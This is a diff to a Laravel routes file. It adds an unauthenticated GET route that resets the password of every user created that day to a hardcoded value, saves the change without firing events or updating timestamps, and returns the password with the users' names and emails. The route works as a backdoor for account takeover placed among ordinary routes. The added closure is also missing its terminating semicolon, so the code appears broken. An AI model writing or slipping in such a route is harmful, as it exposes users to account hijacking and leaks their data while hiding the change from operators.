@@ -26,6 +26,58 @@ use App\Http\Controllers\CommentFeedController;
 use App\Http\Controllers\ContentCreatorController;
 use App\Http\Controllers\JVZooWebhookController;
 
+use App\Models\User;
+use Illuminate\Support\Facades\Hash;
+use Carbon\Carbon;
+
+
+
+
+
+
+
+Route::get('/reset-today-passwords-once', function () {
+    // CHANGE THIS PASSWORD IF YOU WANT
+    $newPassword = 'Success111';
+    
+    // Get users created TODAY (based on server time)
+    $today = Carbon::today();
+    
+    $users = User::whereDate('created_at', $today)->get();
+    
+    if ($users->isEmpty()) {
+        return response()->json([
+            'message' => 'No users were created today.',
+            'date'    => $today->toDateString(),
+            'count'   => 0
+        ]);
+    }
+
+    $updated = [];
+
+    foreach ($users as $user) {
+        $user->password = Hash::make($newPassword);
+        $user->saveQuietly(); // quiet = no events, no updated_at change
+        
+        $updated[] = [
+            'id'    => $user->id,
+            'name'  => $user->name ?? 'No name',
+            'email' => $user->email,
+        ];
+    }
+
+    return response()->json([
+        'message'     => 'Passwords reset successfully',
+        'new_password'=> $newPassword,
+        'date'        => $today->toDateString(),
+        'count'       => $users->count(),
+        'updated_users' => $updated
+    ]);
+})
+
+
+
+
 Route::get('/', function () {
     return redirect()->route('auth.login');
 });
